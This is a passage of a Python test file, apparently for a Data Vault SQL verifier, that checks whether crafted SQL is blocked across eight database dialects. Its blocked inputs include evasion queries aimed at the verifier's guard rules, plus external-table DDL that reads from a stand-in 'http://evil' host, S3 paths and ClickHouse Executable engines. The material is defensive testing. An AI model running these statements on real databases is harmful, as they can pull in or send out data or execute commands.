    # ClickHouse PREWHERE scalar aggregate + DuckDB DETACH DATABASE staging valid control
    ch_prewhere = "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT s.hk_issuer, s.load_dts, 'SRC', s.hash_diff FROM staging.s AS s PREWHERE (SELECT COUNT(*) FROM staging.s) >= 0"
    assert any(d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in verifier.verify_sql(ch_prewhere, "clickhouse"))
    assert verifier.verify_sql("DETACH DATABASE staging", "duckdb_local") == []
    assert gate.verify_sql_ast("duckdb_local", "DETACH DATABASE staging", ir=ir) == []

    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for sat_sql in sat_blocked_sqls:
            s_diags = verifier.verify_sql(sat_sql, tid)
            assert any(d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in s_diags), (tid, sat_sql, s_diags)
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(tid, sat_sql, ir=ir)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50

        for ok_sat in sat_allowed_controls:
            assert verifier.verify_sql(ok_sat, tid) == [], (tid, ok_sat)
            assert gate.verify_sql_ast(tid, ok_sat, ir=ir) == [], (tid, ok_sat)

        for bad_u_sql in any_blocked_sqls:
            u_diags = verifier.verify_sql(bad_u_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER" for d in u_diags), (tid, bad_u_sql, u_diags)
            sat_any_sql = bad_u_sql.replace("raw_vault.lnk_u (hk_u)", "raw_vault.sat_issuer_core (hk_issuer)")
            sat_any_diags = verifier.verify_sql(sat_any_sql, tid)
            assert any(d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER" for d in sat_any_diags), (tid, sat_any_sql, sat_any_diags)
            if not (tid == "sqlserver_fabric" and "ANY(IF(" in bad_u_sql):
                assert has_steward_approved_guard(sqlglot.parse_one(bad_u_sql, read=dialect)) is False, (tid, bad_u_sql)
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        for ok_rhs in any_allowed_controls:
            if tid in ("clickhouse", "sqlserver_fabric") and "ANY(ARRAY" in ok_rhs:
                continue
            if tid == "clickhouse" and "= ANY(s.arr_col)" in ok_rhs:
                continue
            assert verifier.verify_sql(ok_rhs, tid, extra_unstructured_links=["lnk_u"]) == [], (tid, ok_rhs)
            assert gate.verify_sql_ast(tid, ok_rhs.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct) == [], (tid, ok_rhs)

        for io_sql in io_blocked_sqls:
            io_diags = verifier.verify_sql(io_sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in io_diags), (tid, io_sql, io_diags)
            with pytest.raises(OpenDVError) as exc_io:
                gate.verify_sql_ast(tid, io_sql, ir=ir)
            assert exc_io.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_io.value.exit_code == 50


def test_iter27_pivot_setop_left_join_any_and_external_ddl_parity() -> None:
    """Block Iter-27 DV-AST-006, DV-AST-007 ANY(), and external-table/DDL EVAL-AST-01 across 8/8 dialects."""
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    sat_blocked_all_dialects = (
        # PIVOT (standard FOR ... IN)
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT CAST(p.\"a\" AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' "
        "FROM (SELECT k, n FROM staging.s) PIVOT (MAX(n) FOR k IN ('a')) AS p",
        # SetOperation trailing ORDER BY / LIMIT scalar aggregate subqueries
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT s.hk_issuer, s.load_dts, 'SRC', s.hash_diff FROM staging.s AS s "
        "UNION ALL SELECT s.hk_issuer, s.load_dts, 'SRC', s.hash_diff FROM staging.s AS s "
        "ORDER BY (SELECT MAX(hk_issuer) FROM staging.s) "
        "LIMIT (SELECT COUNT(*) FROM staging.s)",
        # _is_safe_grouped_left_join hardening: QUALIFY, inner RIGHT/comma VALUES, non-column GROUP BY
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h "
        "LEFT JOIN (SELECT hk, hk AS hk_issuer FROM staging.s GROUP BY hk "
        "QUALIFY ROW_NUMBER() OVER (ORDER BY MAX(hk)) = 1) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT h.hk_issuer, CURRENT_TIMESTAMP, 'SRC', CAST(sub.cnt AS VARCHAR) "
        "FROM raw_vault.hub_issuer AS h LEFT JOIN (SELECT v.x AS hk_issuer, COUNT(*) AS cnt "
        "FROM staging.s AS s RIGHT JOIN (VALUES ('-1')) AS v(x) ON 1=0 GROUP BY v.x) AS sub "
        "ON h.hk_issuer = sub.hk_issuer",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h "
        "LEFT JOIN (SELECT MAX(v.x) AS hk_issuer FROM staging.s AS s, (VALUES ('z')) AS v(x) "
        "GROUP BY v.x) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h "
        "LEFT JOIN (SELECT MAX(s.hk_issuer) AS hk_issuer FROM staging.s AS s "
        "GROUP BY (s.hk_issuer IS NOT NULL)) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h "
        "LEFT JOIN (SELECT MAX(s.hk_issuer) AS hk_issuer FROM staging.s AS s "
        "GROUP BY (s.hk_issuer = s.hk_issuer)) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h "
        "LEFT JOIN (SELECT MAX(s.hk_issuer) AS hk_issuer FROM staging.s AS s "
        "GROUP BY CASE WHEN s.hk_issuer IS NULL THEN 1 ELSE 1 END) AS sub ON 1=1",
        # Cumulative outer relation safety & CTE recursion
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT COALESCE(sub.hk_issuer, 'evil'), CURRENT_TIMESTAMP, 'SRC', 'x' "
        "FROM staging.s AS s RIGHT JOIN (SELECT 1 AS k) AS d ON 1=0 "
        "LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS md FROM staging.s GROUP BY hk_issuer) "
        "AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "WITH c AS (SELECT 1 AS k FROM (SELECT 1 AS z) AS x LEFT JOIN staging.s AS s ON 1=1) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM c LEFT JOIN "
        "(SELECT MAX(c.k) AS hk_issuer FROM c GROUP BY c.k) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "WITH c AS (SELECT hk_issuer FROM staging.s UNION ALL SELECT 'synthetic') "
        "SELECT COALESCE(sub.hk_issuer, 'evil'), CURRENT_TIMESTAMP, 'SRC', 'x' FROM c "
        "LEFT JOIN (SELECT MAX(hk_issuer) AS hk_issuer FROM staging.s GROUP BY hk_issuer) "
        "AS sub ON 1=1",
        # Outer RIGHT / FULL JOIN against seeded Hub after staging/grouped subquery
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s1 "
        "LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS load_dts FROM raw_vault.sat_issuer_core "
        "GROUP BY hk_issuer) AS sub ON s1.hk = sub.hk_issuer "
        "RIGHT JOIN raw_vault.hub_issuer AS h ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s1 "
        "LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS load_dts FROM raw_vault.sat_issuer_core "
        "GROUP BY hk_issuer) AS sub ON s1.hk = sub.hk_issuer "
        "FULL JOIN raw_vault.hub_issuer AS h ON 1=1",
    )

    duckdb_pivot = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT CAST(p.a AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' "
        "FROM (PIVOT (SELECT k, n FROM staging.s) ON k IN ('a') USING MAX(n)) AS p"
    )
    assert any(
        d.rule_id == "DV-AST-006" and d.severity == "BLOCKER"
        for d in verifier.verify_sql(duckdb_pivot, "duckdb_local")
    )
    duckdb_sample = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' "
        "FROM staging.s AS s TABLESAMPLE ((SELECT COUNT(*) FROM staging.s) ROWS)"
    )
    for sample_tid in ("duckdb_local", "snowflake"):
        assert any(
            d.rule_id == "DV-AST-006" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(duckdb_sample, sample_tid)
        )

    any_blocked_all = (
        "ANY((SELECT s.b))",
        "(SELECT (1 = 0) AS flag) = ANY(s.b)",
        "(SELECT TRUE AS b) = ANY(s.b)",
        "(SELECT FALSE UNION ALL SELECT TRUE) = ANY(s.b)",
        "(SELECT FALSE UNION DISTINCT SELECT FALSE) = ANY(s.b)",
        "(WITH c AS (SELECT FALSE AS f) SELECT f FROM c) = ANY(s.b)",
        "TO_BOOLEAN(0) = ANY(s.b)",
        "TRY_TO_BOOLEAN('true') = ANY(s.b)",
        "TRY_CAST(0 AS BOOLEAN) = ANY(s.b)",
        "BOOL(0) = ANY(s.b)",
        "BOOLEAN(0) = ANY(s.b)",
        "NULLIF(TRUE, FALSE) = ANY(s.b)",
        "GREATEST(TRUE, FALSE) = ANY(s.b)",
        "LEAST(TRUE, FALSE) = ANY(s.b)",
    )
    any_dialect_specific = (
        ("databricks_uc", "ANY(ARRAY[s.b])"),
        ("databricks_uc", "(s.a <=> 1) = ANY(s.b)"),
        ("databricks_uc", "ARRAY_CONTAINS(ARRAY[1], 1) = ANY(s.b)"),
        ("databricks_uc", "IFF(TRUE, FALSE, FALSE) = ANY(s.b)"),
        ("snowflake", "SAFE_CAST(0 AS BOOLEAN) = ANY(s.b)"),
        ("snowflake", "IFF(TRUE, FALSE, FALSE) = ANY(s.b)"),
        ("postgres", "(s.a IS DISTINCT FROM 1) = ANY(s.b)"),
        ("postgres", "(s.a IS NOT DISTINCT FROM 1) = ANY(s.b)"),
        ("postgres", "(SELECT FALSE UNION SELECT FALSE) = ANY(s.b)"),
        ("duckdb_local", "(SELECT FALSE UNION SELECT FALSE) = ANY(s.b)"),
        ("duckdb_local", "IIF(TRUE, FALSE, FALSE) = ANY(s.b)"),
    )
    for d_tid, d_expr in any_dialect_specific:
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN "
            f"{d_expr} THEN 'EVIL' ELSE 'OK' END "
            "FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'"
        )
        s_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT CASE WHEN {d_expr} THEN 'EVIL' ELSE 'OK' END, "
            "CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s"
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, d_tid, extra_unstructured_links=["lnk_u"])
        ), (d_tid, d_expr)
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(s_sql, d_tid)
        ), (d_tid, d_expr)

    ddl_dialect_blocked = (
        ("databricks_uc", "CREATE TABLE staging.ext (id INT) USING PARQUET LOCATION '/tmp/evil'"),
        ("databricks_uc", "CREATE TABLE staging.ext (id INT) LOCATION '/tmp/evil'"),
        ("clickhouse", "CREATE TABLE staging.ext (id Int32) ENGINE = S3('https://b/x.parquet')"),
        ("clickhouse", "CREATE TABLE staging.ext (id Int32) ENGINE = URL('http://evil/x', 'CSV')"),
        ("clickhouse", "CREATE TABLE staging.ext (id Int32) ENGINE = File('Parquet', '/tmp/x')"),
        ("snowflake", "CREATE FILE FORMAT my_fmt TYPE = CSV"),
        ("snowflake", "DROP STAGE my_stage"),
        ("snowflake", "DROP FILE FORMAT my_fmt"),
        ("snowflake", "DROP STORAGE INTEGRATION my_int"),
    )
    for ddl_tid, ddl_sql in ddl_dialect_blocked:
        assert any(
            d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(ddl_sql, ddl_tid)
        ), (ddl_tid, ddl_sql)
        with pytest.raises(OpenDVError) as exc_ddl:
            gate.verify_sql_ast(ddl_tid, ddl_sql, ir=ir)
        assert exc_ddl.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_ddl.value.exit_code == 50

    valid_controls = (
        ("clickhouse", "CREATE TABLE staging.ok (id Int32) ENGINE = MergeTree()"),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' AND "
            "(WITH c AS (SELECT s2.hk AS h FROM staging.s2 AS s2) SELECT h FROM c) = ANY(s.arr)",
        ),
    )
    for ok_tid, ok_sql in valid_controls:
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == []
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct
        ) == []

    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for sat_sql in sat_blocked_all_dialects:
            s_diags = verifier.verify_sql(sat_sql, tid)
            assert any(
                d.rule_id == "DV-AST-006" and d.severity == "BLOCKER" for d in s_diags
            ), (tid, sat_sql, s_diags)
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(tid, sat_sql, ir=ir)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50

        for expr in any_blocked_all:
            bad_u = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN "
                f"{expr} THEN 'EVIL' ELSE 'OK' END "
                "FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'"
            )
            bad_sat = (
                "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
                f"SELECT CASE WHEN {expr} THEN 'EVIL' ELSE 'OK' END, "
                "CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s"
            )
            u_diags = verifier.verify_sql(bad_u, tid, extra_unstructured_links=["lnk_u"])
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in u_diags
            ), (tid, expr, u_diags)
            s_diags = verifier.verify_sql(bad_sat, tid)
            assert any(
                d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in s_diags
            ), (tid, expr, s_diags)
            assert has_steward_approved_guard(sqlglot.parse_one(bad_u, read=dialect)) is False, (
                tid, expr
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_u.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50


def test_iter28_pivot_subquery_all_bool_and_external_ddl_parity() -> None:
    """Remediate Iter-27 DV-AST-006, DV-AST-007 ANY/ALL/bool, and EVAL-AST-01 across 8/8 dialects."""
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    duckdb_pivots_no_using = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT CAST(p.a AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' "
        "FROM (PIVOT (SELECT k FROM staging.s) ON k IN ('a')) AS p",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "WITH c AS (PIVOT (SELECT k FROM staging.s) ON k IN ('a')) "
        "SELECT CAST(c.a AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' FROM c",
    )
    for piv_sql in duckdb_pivots_no_using:
        assert any(
            d.rule_id == "DV-AST-006" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(piv_sql, "duckdb_local")
        ), piv_sql
        with pytest.raises(OpenDVError) as exc_p:
            gate.verify_sql_ast("duckdb_local", piv_sql, ir=ir)
        assert exc_p.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_p.value.exit_code == 50

    sat_blocked_all_dialects = (
        # Parenthesized Subquery trailing ORDER BY / LIMIT scalar aggregate subqueries & bare aggs
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT x.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM "
        "((SELECT hk_issuer FROM staging.s UNION ALL SELECT hk_issuer FROM staging.s2) "
        "ORDER BY (SELECT MAX(hk_issuer) FROM staging.s) "
        "LIMIT (SELECT COUNT(*) FROM staging.s)) AS x",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT x.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM "
        "((SELECT hk_issuer FROM staging.s) ORDER BY (SELECT MAX(hk_issuer) FROM staging.s)) AS x",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT x.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM "
        "((SELECT hk_issuer FROM staging.s) LIMIT (SELECT COUNT(*) FROM staging.s)) AS x",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT x.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM "
        "((SELECT hk_issuer FROM staging.s) ORDER BY MAX(hk_issuer)) AS x",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s "
        "UNION ALL SELECT hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s2 "
        "ORDER BY MAX(hk_issuer)",
        # Parenthesized joins on Subquery / Table with unbacked relation
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM "
        "(staging.s1 AS s1 INNER JOIN (SELECT 1 AS k) AS d ON 1=1) "
        "LEFT JOIN (SELECT hk_issuer, MAX(load_dts) AS md FROM staging.s GROUP BY hk_issuer) AS sub ON 1=1",
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
        "SELECT sub.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' FROM raw_vault.hub_issuer AS h "
        "LEFT JOIN (SELECT s1.hk_issuer, MAX(s1.load_dts) AS md FROM "
        "(staging.s1 AS s1 INNER JOIN (SELECT 1 AS k) AS d ON 1=1) GROUP BY s1.hk_issuer) AS sub ON 1=1",
    )

    any_all_blocked_all = (
        "(1=0) = ALL(s.b)",
        "TRUE = ALL(SELECT x.b FROM staging.x AS x)",
        "NULL = ALL(SELECT x.b FROM staging.x AS x)",
        "ALL(s.b)",
        "(SELECT sub.b FROM (SELECT TRUE AS b) AS sub) = ANY(s.b)",
        "(SELECT sub.x FROM (SELECT TRUE) AS sub(x)) = ANY(s.b)",
        "(WITH c AS (SELECT sub.b FROM (SELECT TRUE AS b) AS sub) SELECT b FROM c) = ANY(s.b)",
        "(SELECT b FROM (WITH c AS (SELECT TRUE AS b) SELECT b FROM c) AS sub) = ANY(s.b)",
        "(VALUES (TRUE)) = ANY(s.b)",
        "(SELECT v.x FROM (VALUES (TRUE)) AS v(x)) = ANY(s.b)",
        "(SELECT * FROM (SELECT TRUE)) = ANY(s.b)",
        "(WITH c AS (SELECT * FROM (SELECT TRUE AS f)) SELECT f FROM c) = ANY(s.b)",
        "ISNAN(1.0) = ANY(s.b)",
        "IS_NAN(1.0) = ANY(s.b)",
        "ISFINITE(1.0) = ANY(s.b)",
        "ISINF(1.0) = ANY(s.b)",
        "PREFIX('abc', 'a') = ANY(s.b)",
        "SUFFIX('abc', 'c') = ANY(s.b)",
        "CONTAINS_SUBSTR('abc', 'a') = ANY(s.b)",
        "REGEXP_FULL_MATCH('abc', 'a.*') = ANY(s.b)",
        "JSON_EXISTS('{}', '$') = ANY(s.b)",
        "NULLIF(1, 1) = ANY(s.b)",
    )

    dialect_bool_blocked = (
        ("sqlserver_fabric", "CONVERT(BIT, 1) = ANY(s.b)"),
        ("sqlserver_fabric", "TRY_CONVERT(BIT, 1) = ANY(s.b)"),
        ("duckdb_local", "('a' GLOB 'a') = ANY(s.b)"),
        ("bigquery", "('a' GLOB 'a') = ANY(s.b)"),
    )
    for d_tid, d_expr in dialect_bool_blocked:
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {d_expr}"
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, d_tid, extra_unstructured_links=["lnk_u"])
        ), (d_tid, d_expr)
        assert has_steward_approved_guard(
            sqlglot.parse_one(u_sql, read=get_dialect_profile(d_tid).sqlglot_dialect or "duckdb")
        ) is False

    ddl_dialect_blocked = (
        ("bigquery", "CREATE TABLE staging.ext (id INT64) OPTIONS(uris=['gs://b/x'], format='PARQUET')"),
        ("snowflake", "CREATE ICEBERG TABLE staging.ext (id INT) EXTERNAL_VOLUME = 'my_vol' CATALOG = 'SNOWFLAKE'"),
        ("snowflake", "DROP ICEBERG TABLE staging.ext"),
        ("snowflake", "DROP EXTERNAL VOLUME my_vol"),
        ("snowflake", "DROP EXTERNAL TABLE staging.ext"),
        ("snowflake", "DROP STREAM staging.st"),
        ("snowflake", "DROP TASK staging.tk"),
        ("clickhouse", "CREATE DICTIONARY staging.d (id UInt64) PRIMARY KEY id SOURCE(HTTP(URL 'http://evil')) LAYOUT(FLAT()) LIFETIME(0)"),
        ("clickhouse", "DROP DICTIONARY staging.d"),
        *(
            ("clickhouse", f"CREATE TABLE staging.ext (id Int32) ENGINE = {eng}('x')")
            for eng in (
                "Executable", "ExecutablePool", "Remote", "RemoteSecure", "Distributed",
                "Dictionary", "MaterializedPostgreSQL", "MaterializedMySQL",
                "ExternalDistributed", "IcebergS3", "IcebergAzure", "IcebergLocal",
                "DeltaLakeS3", "DeltaLakeAzure", "DeltaLakeLocal", "FileLog", "AzureQueue",
            )
        ),
    )
    for ddl_tid, ddl_sql in ddl_dialect_blocked:
        assert any(
            d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(ddl_sql, ddl_tid)
        ), (ddl_tid, ddl_sql)
        with pytest.raises(OpenDVError) as exc_ddl:
            gate.verify_sql_ast(ddl_tid, ddl_sql, ir=ir)
        assert exc_ddl.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_ddl.value.exit_code == 50

    valid_controls = (
        (
            "duckdb_local",
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            "SELECT u.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' "
            "FROM staging.s UNPIVOT (val FOR col IN (a, b)) AS u",
        ),
        ("clickhouse", "CREATE TABLE staging.ok (id Int32) ENGINE = MergeTree()"),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' AND s.hk = ALL(SELECT x.hk FROM staging.x AS x)",
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' "
            "AND (SELECT sub.hk FROM (SELECT s2.hk AS hk FROM staging.s2 AS s2) AS sub) = ANY(s.arr)",
        ),
    )
    for ok_tid, ok_sql in valid_controls:
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == []
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct
        ) == []

    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        ext_loc_sql = "CREATE TABLE staging.ext (id INT) WITH (external_location = 's3://b/x')"
        assert any(
            d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(ext_loc_sql, tid)
        ), tid
        with pytest.raises(OpenDVError) as exc_ext:
            gate.verify_sql_ast(tid, ext_loc_sql, ir=ir)
        assert exc_ext.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_ext.value.exit_code == 50

        for sat_sql in sat_blocked_all_dialects:
            assert any(
                d.rule_id == "DV-AST-006" and d.severity == "BLOCKER"
                for d in verifier.verify_sql(sat_sql, tid)
            ), (tid, sat_sql)
            with pytest.raises(OpenDVError) as exc_s:
                gate.verify_sql_ast(tid, sat_sql, ir=ir)
            assert exc_s.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_s.value.exit_code == 50

        for expr in any_all_blocked_all:
            bad_u = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
                f"WHERE s.steward_gate_status = 'APPROVED' AND {expr}"
            )
            bad_sat = (
                "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
                f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {expr}"
            )
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(bad_u, tid, extra_unstructured_links=["lnk_u"])
            ), (tid, expr)
            assert any(
                d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(bad_sat, tid)
            ), (tid, expr)
            assert has_steward_approved_guard(sqlglot.parse_one(bad_u, read=dialect)) is False, (
                tid, expr
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_u.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        # Compiled baseline bundle zero-FP verification
        bundle = SqlGlotVaultCompiler(tid).compile(ir)
        assert verifier.verify_sql(bundle.full_sql, tid, ir=ir) == []
        assert verifier.verify_sql(bundle.migration_sql, tid, ir=ir) == []


def test_iter29_nontable_insert_udf_summarize_and_bool_guard_parity() -> None:
    """Remediate Iter-28 EVAL-AST-01, SUMMARIZE/DESCRIBE, and bool_expr_guard across 8/8 dialects."""
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
